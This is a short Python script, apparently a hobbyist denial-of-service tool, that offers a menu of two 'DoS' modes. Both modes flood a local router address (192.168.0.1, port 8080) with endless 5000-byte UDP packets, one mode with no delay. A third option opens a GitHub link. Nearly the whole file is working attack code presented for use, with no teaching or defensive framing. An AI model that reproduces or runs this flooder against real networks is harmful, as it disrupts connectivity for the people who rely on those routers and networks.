import time
import webbrowser
import sys,os
import random,socket
Red = "\033[91m"
Yellow = "\033[93m"
Green = "\033[92m"
Blue = "\033[96m"
Back = "\033[90m"
#N\Ta C =
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
byte = random._urandom(5000)
#Nd\A Off
print(f"""
{Blue}*************************************
*************************************
**                                 **
**  *   *    ****    *        *    **
**  * *     *    *   *        *    **
**  *       ******   *        *    **
**  * *     *    *   *        *    **
**  *  *    *    *   ******   *    **
**                                 **
*************************************
************************************* 
V1.0
\n""")
print(f"""{Back}***************
{Green}1.DoS (Normal)
{Red}2.DoS (Core)
{Yellow}0.Me Github
{Back}***************""")
print("")
Cmd = int(input("Enter >> "))
if Cmd == 1:
    os.system("clear")
    print(f"{Green}")
    ip = "192.168.0.1"or "192.168.1.1"
    port = (8080)or (8888)
    print("Waiting data")
    time.sleep(1.4)
    os.system("clear")
    print("Wifi Is Lag")
    while True:
        sock.sendto(byte, (ip,port))
        time.sleep(0.05)
elif Cmd == 2:
    os.system("clear")
    ip = ("192.168.0.1")or ("192.168.1.1")or ("192.168.2.1")
    port = (8080)or (8888)
    print(f"{Yellow}Wait Data Bomb")
    time.sleep(2.1)
    print(f"{Red}")
    use = 0
    while True:
        sock.sendto(byte, (ip,port))
        use = use + 1
        print(f"{Blue}[%s]" %(use))
    
    if use == 1000000:
        use = 1
elif Cmd == 0:
    links = "https://github.com/bjorkateam"
    webbrowser.open(links)
